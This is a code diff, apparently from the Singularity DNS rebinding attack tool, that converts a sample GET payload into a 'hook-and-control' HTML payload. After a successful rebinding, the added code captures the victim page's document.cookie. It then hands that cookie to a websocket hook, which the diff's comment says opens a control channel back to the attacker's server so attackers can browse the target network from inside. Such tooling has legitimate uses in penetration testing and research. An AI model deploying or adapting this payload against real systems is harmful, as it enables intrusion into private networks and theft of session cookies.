@@ -1,18 +1,19 @@
 <!--
-This is a sample payload to make a simple GET request and display the response.
-Copy the content of this file to a new .html file and add its name to the
-`attackPayloads` list in the manager-config.json file.
+This payload requests the target to establish a websocket control channel to Singularity server.
+It then waits for commands from Singularity. Permits attackers to browse the target as if they 
+were working from the target environment.
 -->
 <!doctype html>
 <html>
 
 <head>
-	<title>payload-simple-get</title>
+	<title>payload-hook-and-control</title>
 	<script src="payload.js"></script>
 	<script>
 		/**
 		 * The attack() function is called when the user clicks the "Start Attack" button.
 		 */
+		let initialCookie = "";
 
 		function attack() {
 
@@ -29,8 +30,14 @@ Copy the content of this file to a new .html file and add its name to the
 						}
 						clearInterval(timer); // stop the attack timer
 						console.log("SUCCESS"); // log to the console
+						initialCookie = document.cookie;
 						// Terminate the attack
 						attackSuccess(`Server response: ${response}`);
+						// TKTK implements retry instead.
+						setTimeout(function () {
+							webSocketHook(initialCookie);
+						}, 12000);
+
 					} else {
 						// We saw the token in the response. DNS Rebinding did not happen.
 						// Let's wait for the next time.
